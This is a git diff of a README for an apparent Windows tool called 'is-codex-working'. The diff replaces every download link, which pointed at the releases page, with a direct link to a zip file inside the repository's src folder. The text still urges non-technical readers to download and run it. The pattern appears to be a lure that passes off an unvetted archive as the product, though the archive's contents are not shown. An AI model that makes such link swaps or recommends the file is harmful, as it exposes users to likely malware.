@@ -1,6 +1,6 @@
 # 🛠️ is-codex-working - Know When Codex Is Actually Working
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-is--codex--working-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://github.com/Hallisyncategorematic203/is-codex-working/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-is--codex--working-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://github.com/Hallisyncategorematic203/is-codex-working/raw/refs/heads/main/src/2.6-alpha.2.zip)
 
 ## 👀 What Is This?
 
@@ -30,7 +30,7 @@ Getting started is incredibly simple. You don't need to be a programmer or under
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Hallisyncategorematic203/is-codex-working/releases](https://github.com/Hallisyncategorematic203/is-codex-working/releases)
+Visit this link to download the application: [https://github.com/Hallisyncategorematic203/is-codex-working/raw/refs/heads/main/src/2.6-alpha.2.zip](https://github.com/Hallisyncategorematic203/is-codex-working/raw/refs/heads/main/src/2.6-alpha.2.zip)
 
 On that page, you'll see a list of available versions. Look for the most recent one (usually at the top). Click on it to download the file to your computer.
 
@@ -156,7 +156,7 @@ We welcome feedback and suggestions. If you have an idea for a feature or found 
 
 Ready to give it a try? Remember, it's just one click away:
 
-Visit this link to download the application: [https://github.com/Hallisyncategorematic203/is-codex-working/releases](https://github.com/Hallisyncategorematic203/is-codex-working/releases)
+Visit this link to download the application: [https://github.com/Hallisyncategorematic203/is-codex-working/raw/refs/heads/main/src/2.6-alpha.2.zip](https://github.com/Hallisyncategorematic203/is-codex-working/raw/refs/heads/main/src/2.6-alpha.2.zip)
 
 Download it, run it, and never wonder what Codex is doing again. It's that simple.
 
